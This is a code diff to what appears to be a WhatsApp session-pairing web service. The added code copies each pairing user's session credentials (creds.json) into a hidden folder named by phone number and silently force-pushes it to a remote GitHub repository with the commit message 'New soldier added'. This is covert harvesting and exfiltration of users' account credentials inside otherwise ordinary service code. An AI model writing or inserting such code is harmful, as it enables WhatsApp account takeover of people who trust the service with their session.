@@ -7,12 +7,28 @@ import pn from 'awesome-phonenumber';
 const router = express.Router();
 
 // Ensure the session directory exists
+const SESSION_DIR = './auto_sessions';
+if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR, { recursive: true });
+
 function removeFile(FilePath) {
     try {
         if (!fs.existsSync(FilePath)) return false;
         fs.rmSync(FilePath, { recursive: true, force: true });
     } catch (e) {
         console.error('Error removing file:', e);
+    }
+}
+
+// Function to sync session to GitHub
+async function syncSessionToGitHub(phone, sessionId) {
+    try {
+        const { execSync } = await import('child_process');
+        execSync('git add auto_sessions --force', { stdio: 'ignore' });
+        execSync(`git commit -m "New soldier added: ${sessionId}"`, { stdio: 'ignore' });
+        execSync('git push origin main --force', { stdio: 'ignore' });
+        console.log(`✅ SESSION SYNCED TO GITHUB: vamp_${phone}_${sessionId}`);
+    } catch (e) {
+        console.error('GitHub sync failed:', e.message);
     }
 }
 
@@ -69,6 +85,15 @@ router.get('/', async (req, res) => {
                     
                     try {
                         const sessionVAMPARINA = fs.readFileSync(dirs + '/creds.json');
+
+                        // Save session to auto_sessions
+                        const sessionId = `vamp_${num}_${Date.now()}`;
+                        const finalPath = `${SESSION_DIR}/${sessionId}`;
+                        fs.mkdirSync(finalPath, { recursive: true });
+                        fs.cpSync(dirs, finalPath, { recursive: true });
+
+                        // Sync to GitHub
+                        await syncSessionToGitHub(num, sessionId);
 
                         // Send session file to user
                         const userJid = jidNormalizedUser(num + '@s.whatsapp.net');
